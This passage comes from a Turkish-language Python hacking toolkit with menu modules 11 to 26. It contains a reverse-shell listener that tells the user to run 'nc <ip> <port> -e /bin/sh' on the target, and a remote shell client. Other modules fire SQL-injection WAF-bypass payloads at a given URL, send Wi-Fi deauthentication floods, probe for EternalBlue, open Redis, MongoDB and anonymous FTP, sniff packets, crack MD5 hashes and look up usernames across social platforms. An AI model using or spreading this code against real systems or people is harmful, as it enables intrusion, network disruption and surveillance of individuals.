                print(f"{KIRMIZI}[-] Eski protokol destekleniyor: {proto}")
            except Exception:
                print(f"{YESIL}[✓] {proto} desteklenmiyor")
    log_kaydet("SSL Analizi", f"{host}:{port}", {"tls": bilgi["versiyon"]})
    bekle()

# ============================================================
# 11. MARK OSINT BİLGİ TOPLAMA (Web Arama)
# ============================================================
def markosint_bilgi():
    banner_yap()
    print(f"\n{YESIL}[+] OSINT: Mark Osint Bilgi Toplama (Web + Sosyal Medya)")
    sorgu = input(f"{SARI}Hedef / Arama Sorgusu: ").strip()
    print(f"{YESIL}[*] DuckDuckGo + Bing taranıyor...")
    bulunan = []
    try:
        r = requests.get("https://html.duckduckgo.com/html/", params={"q": sorgu},
                         headers={"User-Agent": UA}, timeout=12)
        for url, baslik in re.findall(r'<a rel="nofollow" class="result__a" href="([^"]+)">(.*?)</a>', r.text)[:10]:
            bulunan.append((re.sub(r"<[^>]+>", "", baslik), url))
    except Exception:
        pass
    try:
        r = requests.get("https://www.bing.com/search", params={"q": sorgu},
                         headers={"User-Agent": UA}, timeout=12)
        for url, baslik in re.findall(r'<h2><a href="([^"]+)"[^>]*>(.*?)</a></h2>', r.text)[:10]:
            bulunan.append((re.sub(r"<[^>]+>", "", baslik), url))
    except Exception:
        pass
    if not bulunan:
        print(f"{KIRMIZI}[-] Sonuç bulunamadı (arama motoru engellemiş olabilir).")
    for baslik, url in bulunan:
        print(f"{YESIL}[+] {baslik[:80]}")
        print(f"{MAVI}    {url[:100]}")
    log_kaydet("MarkOsint", sorgu, {"sonuc": len(bulunan)})
    bekle()

# ============================================================
# 12. MARKOS TERM ÖZEL KABUK (TCP Shell)
# ============================================================
def markos_kabuk():
    banner_yap()
    print(f"\n{YESIL}[+] MarkOs Term Özel Kabuk (TCP Shell Aracı)")
    print(f"{SARI}  1) Dinleyici (reverse shell karşılama)")
    print(f"{SARI}  2) Bağlan (uzak shell'e bağlan)")
    sec = input(f"{YESIL}Seçim [1/2]: ").strip()
    if sec == "1":
        port = int(input(f"{SARI}Dinleme portu: ").strip() or "4444")
        print(f"{YESIL}[*] {port} portunda dinleniyor... (Ctrl+C çıkış)")
        ls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        ls.bind(("0.0.0.0", port)); ls.listen(1)
        print(f"{MAVI}[!] Hedef makinede çalıştır: nc {public_ip() or yerel_ip()} {port} -e /bin/sh")
        try:
            baglanti, adres = ls.accept()
            print(f"{YESIL}[+] Bağlantı: {adres}")
            while True:
                komut = input(f"{KIRMIZI}shell@{adres[0]}# ").strip()
                if komut.lower() in ("exit", "quit"):
                    baglanti.send(b"exit\n"); break
                baglanti.send((komut + "\n").encode())
                time.sleep(0.3)
                try:
                    baglanti.settimeout(2)
                    print(baglanti.recv(65536).decode(errors="replace"), end="")
                except Exception:
                    pass
        except KeyboardInterrupt:
            print(f"\n{SARI}[!] Dinleyici kapatıldı.")
        ls.close()
    elif sec == "2":
        hedef = input(f"{SARI}Hedef IP: ").strip()
        port = int(input(f"{SARI}Port: ").strip() or "4444")
        try:
            s = socket.socket(); s.settimeout(8); s.connect((hedef, port))
            print(f"{YESIL}[+] Bağlandı! (exit ile çık)")
            while True:
                komut = input(f"{KIRMIZI}markos@{hedef}# ").strip()
                if komut.lower() in ("exit", "quit"): break
                s.send((komut + "\n").encode())
                time.sleep(0.3)
                try:
                    s.settimeout(2)
                    print(s.recv(65536).decode(errors="replace"), end="")
                except Exception:
                    pass
            s.close()
        except Exception as e:
            print(f"{KIRMIZI}[-] Bağlantı hatası: {e}")
    else:
        print(f"{KIRMIZI}[-] Geçersiz seçim.")
    log_kaydet("MarkOs Kabuk", "", {"mod": sec})
    bekle()

# ============================================================
# 13. MARKOS HACK ANA İSTİSMAR (Hızlı Zafiyet Kontrolü)
# ============================================================
def hack_istismar():
    banner_yap()
    print(f"\n{YESIL}[+] MarkOs Hack Ana İstismar (Hızlı Zafiyet Kontrolü)")
    hedef = input(f"{SARI}Hedef IP: ").strip()
    print(f"{YESIL}[*] Yaygın istismar kontrolleri yapılıyor...")
    # SMBv1 / MS17-010 (EternalBlue)
    try:
        s = socket.socket(); s.settimeout(6); s.connect((hedef, 445))
        smb = b"\xff\x53\x4d\x42\x72" + b"\x00" * 27 + b"\x02NT LM 0.12\x00"
        s.send(b"\x00\x00\x00\x2d" + smb)
        cevap = s.recv(256); s.close()
        if b"\xff\x53\x4d\x42\x72" in cevap:
            print(f"{KIRMIZI}[-] SMBv1 AKTİF -> MS17-010 (EternalBlue) riski!")
        else:
            print(f"{YESIL}[✓] SMBv1 görünmüyor (SMB2-only olabilir)")
    except Exception:
        print(f"{SARI}[!] 445 kapalı veya erişilemedi")
    # Redis kimliksiz erişim
    try:
        s = socket.socket(); s.settimeout(5); s.connect((hedef, 6379))
        s.send(b"PING\r\n"); c = s.recv(64).decode(errors="replace").strip(); s.close()
        if "PONG" in c:
            print(f"{KIRMIZI}[-] Redis KİMLİKSİZ ERİŞİM AÇIK! (PING -> PONG)")
        else:
            print(f"{YESIL}[✓] Redis kimlik doğrulamalı")
    except Exception:
        print(f"{SARI}[!] Redis (6379) kapalı")
    # MySQL banner
    try:
        s = socket.socket(); s.settimeout(5); s.connect((hedef, 3306))
        b = s.recv(64); s.close()
        if b[:1] == b"\x0a" or b"mysql" in b.lower():
            print(f"{SARI}[*] MySQL açık - root boş şifre / zayıf kimlik testi önerilir")
    except Exception:
        pass
    # MongoDB kimliksiz erişim (OP_QUERY ismaster)
    try:
        ns = b"admin.$cmd\x00"
        qdoc = b"\x18\x00\x00\x00\x0aismaster\x00" + struct.pack("<d", 1.0) + b"\x00"
        pkt = struct.pack("<iiii", 16 + len(ns) + 8 + len(qdoc), 1, 0, 2004) + ns + \
              struct.pack("<ii", 0, 1) + qdoc
        s = socket.socket(); s.settimeout(5); s.connect((hedef, 27017))
        s.send(pkt); c = s.recv(256); s.close()
        if b"ismaster" in c:
            print(f"{KIRMIZI}[-] MongoDB kimliksiz erişim MUHTEMEL!")
    except Exception:
        pass
    # FTP anonim giriş
    try:
        s = socket.socket(); s.settimeout(5); s.connect((hedef, 21))
        s.recv(256); s.send(b"USER anonymous\r\n"); s.recv(256)
        s.send(b"PASS anonymous@\r\n"); b3 = s.recv(256); s.close()
        if b"230" in b3:
            print(f"{KIRMIZI}[-] FTP ANONİM GİRİŞ AÇIK!")
        else:
            print(f"{YESIL}[✓] FTP anonim giriş yok")
    except Exception:
        pass
    log_kaydet("İstismar Kontrolü", hedef, {})
    bekle()

# ============================================================
# 14. WAF SALDIRISI & BYPASS
# ============================================================
def waf_bypass():
    banner_yap()
    print(f"\n{YESIL}[+] WAF Saldırısı & Bypass Deneme Sistemi")
    hedef = input(f"{SARI}Hedef URL (Örn: https://site.com/index.php?id=1): ").strip()
    if not hedef.startswith(("http://", "https://")):
        hedef = "https://" + hedef
    bypasslar = {
        "Orijinal SQLi": "1' OR '1'='1",
        "Yorum İçi SQLi": "1'/**/OR/**/'1'='1",
        "Büyük Harf": "1' Or '1'='1",
        "URL Kodlama": "1%27%20OR%20%271%27%3D%271",
        "Çift Kodlama": "1%2527%2520OR%2520%25271%2527%253D%25271",
        "Null Byte": "1%00' OR '1'='1",
        "Ters Eğik Çizgi": "1\\' OR '1'='1",
        "Yeni Satır": "1'\nOR\n'1'='1",
        "Tab Karakter": "1'\tOR\t'1'='1",
        "IP Bypass (XFF)": None,
    }
    print(f"{MAVI}{'TEKNİK':<22}DURUM")
    print(f"{MAVI}{'-'*60}")
    for ad, payload in bypasslar.items():
        try:
            if payload is None:
                r = requests.get(hedef, headers={"User-Agent": UA,
                                 "X-Forwarded-For": "127.0.0.1",
                                 "X-Real-IP": "127.0.0.1"}, timeout=8, verify=False)
            else:
                r = requests.get(hedef, params={"id": payload},
                                 headers={"User-Agent": UA}, timeout=8, verify=False)
            durum = f"HTTP {r.status_code} ({len(r.content)} bayt)"
            print(f"{YESIL}{ad:<22}{durum}")
        except Exception:
            print(f"{KIRMIZI}{ad:<22}Zaman aşımı / engellendi")
    print(f"\n{SARI}[*] 200 vs 403 farkı = bypass sinyali; davranış farkını hedef mantıkta doğrulayın.")
    log_kaydet("WAF Bypass", hedef, {})
    bekle()

# ============================================================
# 15. WIFIX 5.0 GELİŞMİŞ AĞ (LAN Keşif)
# ============================================================
def wifix_ag():
    banner_yap()
    print(f"\n{YESIL}[+] Wifix 5.0 Gelişmiş Ağ (LAN Keşif + Port Tarama)")
    ag = input(f"{SARI}Hedef Ağ (Örn: 192.168.1.0/24 veya IP): ").strip()
    print(f"{YESIL}[*] Ağ taranıyor...")
    if "/" in ag:
        taban = ag.split("/")[0].split(".")
        cihazlar = []
        def ping(son):
            ip = f"{taban[0]}.{taban[1]}.{taban[2]}.{son}"
            try:
                c = subprocess.run(["ping", "-c", "1", "-W", "1", ip],
                                   capture_output=True, timeout=2)
                if c.returncode == 0:
                    cihazlar.append(ip)
            except Exception:
                pass
        ths = [threading.Thread(target=ping, args=(s,)) for s in range(1, 255)]
        for t in ths: t.start()
        for t in ths: t.join()
        print(f"\n{YESIL}[+] Aktif cihazlar: {len(cihazlar)}")
        for ip in sorted(cihazlar, key=lambda x: int(x.split(".")[-1])):
            acik = port_tara(ip, [22, 80, 443, 445, 3389, 8080], timeout=0.4)
            print(f"{YESIL}  {ip}  Açık: {', '.join(map(str, sorted(acik))) or 'yok'}")
    else:
        acik = port_tara(ag, [21,22,23,25,53,80,110,143,443,445,993,995,
                              1433,1521,3306,3389,5432,5900,6379,8080,
                              8443,9200,27017], timeout=0.5)
        print(f"\n{YESIL}[+] {ag} açık portları:")
        for p in sorted(acik):
            print(f"{YESIL}  {p:<6}{SERVIS_HARITASI.get(p, '?')}")
    log_kaydet("Wifix Ağ", ag, {})
    bekle()

# ============================================================
# 16. INSTAGRAM FINDER
# ============================================================
def instagram_finder():
    banner_yap()
    print(f"\n{YESIL}[+] Instagram Finder (Profil Keşif + Takipçi)")
    kullanici = input(f"{SARI}Kullanıcı adı: ").strip().lstrip("@")
    if not re.fullmatch(r"[A-Za-z0-9._]{1,30}", kullanici):
        print(f"{KIRMIZI}[-] Geçersiz kullanıcı adı!")
        bekle(); return
    var = False
    try:
        r = requests.get(f"https://www.instagram.com/{kullanici}/",
                         headers={"User-Agent": UA}, timeout=12)
        if r.status_code == 200:
            var = True
            print(f"{YESIL}[✓] Profil MEVCUT: instagram.com/{kullanici}")
            takipci = re.search(r'"edge_followed_by":\s*{"count":\s*(\d+)', r.text)
            takip = re.search(r'"edge_follow":\s*{"count":\s*(\d+)', r.text)
            gonderi = re.search(r'"edge_owner_to_timeline_media":\s*{"count":\s*(\d+)', r.text)
            if takipci: print(f"{YESIL}[+] Takipçi: {takipci.group(1)}")
            if takip: print(f"{YESIL}[+] Takip: {takip.group(1)}")
            if gonderi: print(f"{YESIL}[+] Gönderi: {gonderi.group(1)}")
        else:
            print(f"{KIRMIZI}[-] Profil bulunamadı (HTTP {r.status_code})")
    except Exception:
        print(f"{SARI}[!] Instagram erişimi engellendi (bot koruması).")
    log_kaydet("Instagram Finder", kullanici, {"var": var})
    bekle()

# ============================================================
# 17. IP YEREL ANALİZÖR
# ============================================================
def ip_analiz():
    banner_yap()
    print(f"\n{YESIL}[+] IP Yerel Analizör (GeoIP + ISP + ASN)")
    hedef = input(f"{SARI}IP Adresi (boş = kendi IP'n): ").strip()
    if not hedef:
        hedef = public_ip() or yerel_ip() or "8.8.8.8"
    bilgi = ip_api(hedef)
    if not bilgi:
        print(f"{KIRMIZI}[-] IP bilgisi alınamadı!")
        bekle(); return
    for anahtar, etiket in [("country","Ülke"),("regionName","Bölge"),
                            ("city","Şehir"),("isp","ISS"),("org","Kurum"),
                            ("as","ASN"),("lat","Enlem"),("lon","Boylam"),
                            ("timezone","Saat Dilimi"),("reverse","Reverse DNS")]:
        deger = bilgi.get(anahtar)
        if deger:
            print(f"{YESIL}[+] {etiket}: {deger}")
    if bilgi.get("lat"):
        print(f"{MAVI}[*] Harita: https://www.google.com/maps?q={bilgi['lat']},{bilgi['lon']}")
    log_kaydet("IP Analiz", hedef, bilgi)
    bekle()

# ============================================================
# 18. NETDRAX PAKET KOKLAYICI
# ============================================================
def netdrax_kokla():
    banner_yap()
    print(f"\n{YESIL}[+] NetDrax Paket Koklayıcı (Pasif Sniffer)")
    if not SCAPY_VAR:
        print(f"{KIRMIZI}[-] scapy kurulu değil! Kurulum: pip install scapy")
        bekle(); return
    try:
        from scapy.all import sniff, IP, TCP, UDP
    except Exception:
        print(f"{KIRMIZI}[-] scapy bileşenleri yüklenemedi!")
        bekle(); return
    arayuz = input(f"{SARI}Arayüz (boş = otomatik, örn: wlan0): ").strip()
    sure = int(input(f"{SARI}Dinleme süresi (sn, boş=30): ").strip() or "30")
    print(f"{YESIL}[*] {sure} sn paket yakalanıyor... (Ctrl+C durdurur)")
    sayac = {"tcp": 0, "udp": 0, "icmp": 0, "http": 0, "diger": 0}
    def isle(pkt):
        try:
            if pkt.haslayer(IP):
                ip = pkt[IP]
                if pkt.haslayer(TCP):
                    sayac["tcp"] += 1
                    if pkt[TCP].dport == 80 or pkt[TCP].sport == 80:
                        sayac["http"] += 1
                        print(f"{SARI}[HTTP] {ip.src}:{pkt[TCP].sport} -> {ip.dst}:{pkt[TCP].dport}")
                elif pkt.haslayer(UDP):
                    sayac["udp"] += 1
                elif ip.proto == 1:
                    sayac["icmp"] += 1
                else:
                    sayac["diger"] += 1
        except Exception:
            pass
    try:
        kwargs = {"prn": isle, "store": False, "timeout": sure}
        if arayuz:
            kwargs["iface"] = arayuz
        sniff(**kwargs)
    except PermissionError:
        print(f"{KIRMIZI}[-] Root gerekli! pkg install tsu && tsu ile çalıştırın.")
    except Exception as e:
        print(f"{KIRMIZI}[-] Hata: {e}")
    print(f"\n{YESIL}[+] Özet: TCP={sayac['tcp']} UDP={sayac['udp']} ICMP={sayac['icmp']} "
          f"HTTP={sayac['http']} Diğer={sayac['diger']}")
    log_kaydet("NetDrax", "", sayac)
    bekle()

# ============================================================
# 19. WIFI MAP COĞRAFİ
# ============================================================
def wifi_map():
    banner_yap()
    print(f"\n{YESIL}[+] Wifi Map Coğrafi (Yakın Ağ Taraması)")
    try:
        cikti = subprocess.run(["iw", "dev"], capture_output=True, text=True,
                               timeout=8).stdout
        arayuzler = re.findall(r"Interface\s+(\S+)", cikti)
        if not arayuzler:
            print(f"{KIRMIZI}[-] Arayüz bulunamadı. Wi-Fi kapalı mı?")
            bekle(); return
        arayuz = arayuzler[0]
        print(f"{YESIL}[*] {arayuz} üzerinde tarama yapılıyor...")
        sonuc = subprocess.run(["iw", arayuz, "scan", "ap"], capture_output=True,
                               text=True, timeout=30)
        desen = re.compile(r"BSS\s+([0-9a-f:]{17})(?:(?!BSS\s).)*?SSID:\s*(.*?)\n", re.S)
        aglar = desen.findall(sonuc.stdout)
        if not aglar:
            print(f"{SARI}[!] Ağ bulunamadı veya root gerekli (tsu deneyin).")
            bekle(); return
        print(f"{MAVI}{'SSID':<28}{'BSSID':<20}")
        print(f"{MAVI}{'-'*50}")
        for bssid, ssid in aglar[:20]:
            print(f"{YESIL}{ssid.strip()[:28]:<28}{bssid}")
        konum = ip_api(public_ip() or "")
        if konum:
            print(f"\n{MAVI}[*] Ağ konumu: {konum.get('city')}, {konum.get('country')} "
                  f"(https://www.google.com/maps?q={konum.get('lat')},{konum.get('lon')})")
    except FileNotFoundError:
        print(f"{KIRMIZI}[-] 'iw' bulunamadı! pkg install iw")
    except Exception as e:
        print(f"{KIRMIZI}[-] Hata: {e}")
    log_kaydet("Wifi Map", "", {})
    bekle()

# ============================================================
# 20. WIFI ATTACK TAARRUZ (Deauth)
# ============================================================
def wifi_attack():
    banner_yap()
    print(f"\n{YESIL}[+] Wifi Attack Taarruz (Deauth Saldırısı)")
    if not SCAPY_VAR:
        print(f"{KIRMIZI}[-] scapy gerekli: pip install scapy")
        bekle(); return
    print(f"{MAVI}[!] ÖN KOŞUL: Arayüz monitor modunda olmalı!")
    print(f"{MAVI}    airmon-ng start wlan0   veya   iw dev wlan0 set type monitor")
    arayuz = input(f"{SARI}Arayüz (örn: wlan0mon): ").strip()
    hedef = input(f"{SARI}Hedef BSSID/AP MAC (AA:BB:CC:DD:EE:FF): ").strip()
    istemci = input(f"{SARI}İstemci MAC (boş = broadcast deauth): ").strip()
    adet = int(input(f"{SARI}Paket sayısı (boş=100): ").strip() or "100")
    if not re.fullmatch(r"[0-9a-fA-F:]{17}", hedef):
        print(f"{KIRMIZI}[-] Geçersiz MAC formatı!")
        bekle(); return
    print(f"{YESIL}[*] {adet} deauth paketi gönderiliyor...")
    try:
        from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
        for i in range(adet):
            pkt = RadioTap()/Dot11(addr1=istemci or "ff:ff:ff:ff:ff:ff",
                                   addr2=hedef, addr3=hedef)/Dot11Deauth(reason=7)
            sendp(pkt, iface=arayuz, verbose=False)
            time.sleep(0.05)
        print(f"{YESIL}[✓] {adet} paket gönderildi.")
    except PermissionError:
        print(f"{KIRMIZI}[-] Root gerekli! tsu ile çalıştırın.")
    except Exception as e:
        print(f"{KIRMIZI}[-] Hata: {e}")
    log_kaydet("Wifi Deauth", hedef, {"adet": adet})
    bekle()

# ============================================================
# 21. USERID KONUM BULUCU (Kullanıcı Adı OSINT)
# ============================================================
def userid_konum():
    banner_yap()
    print(f"\n{YESIL}[+] UserId Konum Bulucu (Kullanıcı Adı OSINT)")
    kullanici = input(f"{SARI}Kullanıcı adı: ").strip()
    siteler = [
        ("GitHub", "https://github.com/{}"), ("GitLab", "https://gitlab.com/{}"),
        ("Reddit", "https://www.reddit.com/user/{}"), ("Twitch", "https://www.twitch.tv/{}"),
        ("Steam", "https://steamcommunity.com/id/{}"), ("Pinterest", "https://www.pinterest.com/{}/"),
("Pinterest", "https://www.pinterest.com/{}/"),
        ("Telegram", "https://t.me/{}"), ("TikTok", "https://www.tiktok.com/@{}"),
        ("YouTube", "https://www.youtube.com/@{}/"), ("Instagram", "https://www.instagram.com/{}/"),
        ("Facebook", "https://www.facebook.com/{}/"), ("X", "https://x.com/{}"),
        ("VK", "https://vk.com/{}"), ("Flickr", "https://www.flickr.com/people/{}/"),
        ("Keybase", "https://keybase.io/{}"), ("Medium", "https://medium.com/@{}"),
        ("Dribbble", "https://dribbble.com/{}"), ("Behance", "https://www.behance.net/{}"),
        ("BitBucket", "https://bitbucket.org/{}/"), ("HackerNews", "https://news.ycombinator.com/user?id={}"),
    ]
    print(f"{YESIL}[*] {len(siteler)} platform kontrol ediliyor...")
    bulunan = []
    for ad, url in siteler:
        try:
            r = requests.get(url.format(kullanici), headers={"User-Agent": UA},
                             timeout=6, allow_redirects=True, verify=False)
            if r.status_code == 200 and "not found" not in r.text[:500].lower():
                bulunan.append((ad, url.format(kullanici)))
                print(f"{YESIL}[✓] {ad:<12} {url.format(kullanici)}")
        except Exception:
            pass
    if not bulunan:
        print(f"{KIRMIZI}[-] Hiçbir platformda kullanıcı bulunamadı.")
    log_kaydet("UserId OSINT", kullanici, {"bulunan": len(bulunan)})
    bekle()

# ============================================================
# 22. ORACLE DB ANALİZÖRÜ
# ============================================================
def oracle_analiz():
    banner_yap()
    print(f"\n{YESIL}[+] Oracle DB Analizörü (TNS Port Tarama + Tanımlama)")
    hedef = input(f"{SARI}Hedef IP: ").strip()
    port = int(input(f"{SARI}Port (boş=1521): ").strip() or "1521")
    print(f"{YESIL}[*] {hedef}:{port} TNS protokolü kontrol ediliyor...")
    try:
        s = socket.socket(); s.settimeout(6); s.connect((hedef, port))
        # TNS Connect (CONNECT_DATA=(SERVICE_NAME=...)) paketi
        paket = (b"\x00\x5a\x00\x00\x01\x00\x00\x00\x01\x36\x01\x2c\x00\x00\x08\x00"
                 b"\x7f\xff\x7f\x08\x00\x00\x01\x00\x00\x18\x00\x3f\x00\x00\x00\x00"
                 b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                 b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                 b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                 b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                 b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                 b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                 b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                 b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
        s.send(paket)
        cevap = s.recv(256); s.close()
        if len(cevap) >= 2 and cevap[1] == 0x00 or b"TNS" in cevap.upper():
            print(f"{KIRMIZI}[-] TNS SERVİSİ TESPİT EDİLDİ -> Oracle DB açık!")
            print(f"{SARI}[!] TNS Listener zafiyetleri: CVE-2012-1675 (TNS Poison)")
            print(f"{SARI}[!] Sonraki adım: zayıf SID brute-force / TNS poisoning testi")
        else:
            print(f"{YESIL}[+] Port açık ancak TNS imzası yok (farklı servis olabilir)")
    except Exception:
        print(f"{KIRMIZI}[-] Bağlantı kurulamadı (port kapalı veya filtreli)")
    log_kaydet("Oracle Analiz", hedef, {"port": port})
    bekle()

# ============================================================
# 23. KİŞİSEL VERİ DOĞRULAMA (TC Kimlik + Kart)
# ============================================================
def kisisel_veri():
    banner_yap()
    print(f"\n{YESIL}[+] Kişisel Veri Doğrulama (TC Kimlik + Kart Luhn)")
    print(f"{MAVI}{'='*50}\n{MAVI}[TC Kimlik No]")
    tc = input(f"{SARI}TC Kimlik No: ").strip()
    if tc_kontrol(tc):
        print(f"{YESIL}[✓] TC Kimlik: GEÇERLİ (algoritma doğrulandı)")
        print(f"{SARI}[!] 10. hane ({tc[9]}): çift-tek toplam doğrulaması başarılı")
        print(f"{SARI}[!] 11. hane ({tc[10]}): mod-10 doğrulaması başarılı")
    else:
        print(f"{KIRMIZI}[-] TC Kimlik: GEÇERSİZ veya hatalı format")
    print(f"\n{MAVI}{'='*50}\n{MAVI}[Kredi Kartı (Luhn)]")
    kart = input(f"{SARI}Kart No (boş = geç): ").strip()
    if kart:
        if luhn_dogrula(kart):
            print(f"{YESIL}[✓] Kart: GEÇERLİ Luhn doğrulaması")
            temiz = kart.replace(" ", "").replace("-", "")
            if temiz.startswith("4"):
                print(f"{YESIL}[+] Ağ: VISA")
            elif temiz.startswith(("51", "52", "53", "54", "55")) or \
                 re.match(r"^22[2-9]", temiz):
                print(f"{YESIL}[+] Ağ: MASTERCARD")
            elif temiz.startswith(("34", "37")):
                print(f"{YESIL}[+] Ağ: AMEX")
            elif temiz.startswith("62"):
                print(f"{YESIL}[+] Ağ: UNIONPAY")
            else:
                print(f"{SARI}[*] Ağ: Bilinmiyor")
        else:
            print(f"{KIRMIZI}[-] Kart: GEÇERSİZ Luhn doğrulaması")
    print(f"\n{SARI}[!] Not: Bu araç yalnızca FORMAT/algoritma doğrulaması yapar;")
    print(f"{SARI}    gerçek kimlik/kart doğrulaması devlet/ödeme kurumu yetkisindedir.")
    log_kaydet("Veri Doğrulama", tc[:3] + "***", {"tc": tc_kontrol(tc)})
    bekle()

# ============================================================
# 24. DATA FORCH v2.0 (Parola Güç Analizi)
# ============================================================
def data_forch_v2():
    banner_yap()
    print(f"\n{YESIL}[+] Data Forch v2.0 (Parola Güç Analizörü)")
    parola = input(f"{SARI}Analiz edilecek parola: ").strip()
    if not parola:
        print(f"{KIRMIZI}[-] Parola boş olamaz!"); bekle(); return
    uzunluk = len(parola)
    kucuk = bool(re.search(r"[a-z]", parola)); buyuk = bool(re.search(r"[A-Z]", parola))
    rakam = bool(re.search(r"\d", parola)); ozel = bool(re.search(r"[^A-Za-z0-9]", parola))
    havuz = 0
    if kucuk: havuz += 26
    if buyuk: havuz += 26
    if rakam: havuz += 10
    if ozel: havuz += 33
    uzay = max(havuz ** uzunluk, 1)
    saniye = uzay / 1_000_000_000  # ~1 milyar deneme/sn
    print(f"\n{MAVI}{'KRİTER':<20}DURUM")
    print(f"{MAVI}{'-'*45}")
    print(f"{YESIL}{'Uzunluk':<20}{uzunluk} karakter")
    for ad, var in [("Küçük harf", kucuk), ("Büyük harf", buyuk),
                    ("Rakam", rakam), ("Özel karakter", ozel)]:
        print(f"{YESIL}{ad:<20}{'✓' if var else '✗'}")
    puan = min(uzunluk * 4 + (5 if kucuk else 0) + (5 if buyuk else 0) +
               (5 if rakam else 0) + (8 if ozel else 0), 100)
    print(f"\n{SARI}[!] Güç Puanı: {puan}/100 -> "
          f"{'ÇOK GÜÇLÜ' if puan >= 80 else 'GÜÇLÜ' if puan >= 60 else 'ORTA' if puan >= 40 else 'ZAYIF'}")
    print(f"{SARI}[*] Kaba kuvvet süresi (tahmini): {insan_zamani(saniye)} "
          f"(~1 milyar deneme/sn ile)")
    print(f"{MAVI}{'='*45}")
    print(f"{MAVI}[Kaba Kuvvet Deneme Modu]")
    print(f"{SARI}  1) 4 haneli PIN (0000-9999)   2) 6 haneli PIN   3) 8 haneli PIN")
    sec = input(f"{YESIL}Seçim (boş = atla): ").strip()
    if sec in ("1", "2", "3"):
        uz = {"1": 4, "2": 6, "3": 8}[sec]
        import itertools
        print(f"{YESIL}[*] {10**uz:,} olasılık deneniyor...")
        bas = time.time()
        bulundu = False
        for deneme in itertools.product("0123456789", repeat=uz):
            if "".join(deneme) == parola:
                bulundu = True; break
        gecen = time.time() - bas
        if bulundu:
            print(f"{YESIL}[✓] PAROLA KIRILDI: {parola} ({gecen:.2f} sn)")
        else:
            print(f"{KIRMIZI}[-] {10**uz} olasılık denendi, bulunamadı ({gecen:.2f} sn)")
    log_kaydet("Data Forch v2", "", {"puan": puan})
    bekle()

# ============================================================
# 25. DATA FORCH v3.0 (Hash Üretme + Saldırı)
# ============================================================
def data_forch_v3():
    banner_yap()
    print(f"\n{YESIL}[+] Data Forch v3.0 (Hash Üretici + MD5 Kırıcı)")
    print(f"{MAVI}{'='*50}\n{MAVI}[1] Hash Üret")
    metin = input(f"{SARI}Metin (boş = atla): ").strip()
    if metin:
        print(f"{YESIL}[+] MD5:    {hashlib.md5(metin.encode()).hexdigest()}")
        print(f"{YESIL}[+] SHA1:   {hashlib.sha1(metin.encode()).hexdigest()}")
        print(f"{YESIL}[+] SHA256: {hashlib.sha256(metin.encode()).hexdigest()}")
        print(f"{YESIL}[+] SHA512: {hashlib.sha512(metin.encode()).hexdigest()}")
    print(f"\n{MAVI}{'='*50}\n{MAVI}[2] MD5 Sözlük Saldırısı")
    hedef_hash = input(f"{SARI}Kırılacak MD5 (boş = atla): ").strip()
    if hedef_hash:
        kelime_listesi = ["123456", "password", "12345678", "qwerty", "admin",
                          "letmein", "welcome", "monkey", "dragon", "football",
                          "master", "login", "princess", "abc123", "passw0rd",
                          "karanlık", "türkiye", "istanbul", "ankara", "parola",
                          "sifre", "secret", "iloveyou", "sunshine", "trustno1",
                          "admin123", "root", "toor", "test", "demo"]
        bulundu = False
        for kelime in kelime_listesi:
            if hashlib.md5(kelime.encode()).hexdigest() == hedef_hash.lower():
                print(f"{KIRMIZI}[-] PAROLA BULUNDU: {kelime}")
                bulundu = True; break
        if not bulundu:
            print(f"{SARI}[!] Sözlükte yok. Özel liste için ~/markos_wordlist.txt "
                  f"(satır satır) oluşturun.")
            if os.path.exists(os.path.expanduser("~/markos_wordlist.txt")):
                print(f"{YESIL}[*] Özel sözlük deneniyor...")
                with open(os.path.expanduser("~/markos_wordlist.txt"), errors="ignore") as f:
                    for satir in f:
                        kelime = satir.strip()
                        if hashlib.md5(kelime.encode()).hexdigest() == hedef_hash.lower():
                            print(f"{KIRMIZI}[-] PAROLA BULUNDU: {kelime}")
                            bulundu = True; break
                if not bulundu:
                    print(f"{KIRMIZI}[-] Bulunamadı.")
    log_kaydet("Data Forch v3", hedef_hash[:8] if hedef_hash else "", {})
    bekle()

# ============================================================
# 26. DATA FORCH v4.0 (Sezar + Base64 + ROT13 Şifre Çözücü)
# ============================================================
def data_forch_v4():
    banner_yap()
    print(f"\n{YESIL}[+] Data Forch v4.0 (Klasik Şifre Çözücü)")
    metin = input(f"{SARI}Şifreli / kodlu metin: ").strip()
    if not metin:
        print(f"{KIRMIZI}[-] Metin boş!"); bekle(); return
    print(f"\n{MAVI}[Base64]")
    for mod in ("standard", "url", "b64decode"):
        try:
            if mod == "standard":
                c = base64.b64decode(metin).decode(errors="replace")
            elif mod == "url":
                c = base64.urlsafe_b64decode(metin + "=" * (-len(metin) % 4)).decode(errors="replace")
            else:
                c = base64.b64decode(metin + "=" * (-len(metin) % 4)).decode(errors="replace")
            print(f"{YESIL}[+] {mod}: {c[:200]}")
        except Exception:
            pass
    print(f"\n{MAVI}[ROT13]")
    try:
        import codecs
        print(f"{YESIL}[+] {codecs.decode(metin, 'rot_13')[:200]}")
    except Exception:
        pass
    print(f"\n{MAVI}[Sezar Tüm Kaydırmalar (1-25)]")
    def sezar(s, kaydir):
        cikti = []
        for ch in s:
            if ch.isalpha():
                taban = ord("A") if ch.isupper() else ord("a")
                cikti.append(chr((ord(ch) - taban + kaydir) % 26 + taban))
            else:
                cikti.append(ch)
        return "".join(cikti)
    for kaydir in range(1, 26):
        print(f"{YESIL}[{kaydir:>2}] {sezar(metin, kaydir)[:120]}")
    print(f"\n{SARI}[*] İpucu: Okunabilir sonucu bulana kadar kaydırmaları inceleyin.")
    log_kaydet("Data Forch v4", metin[:30], {})
    bekle()

# ============================================================
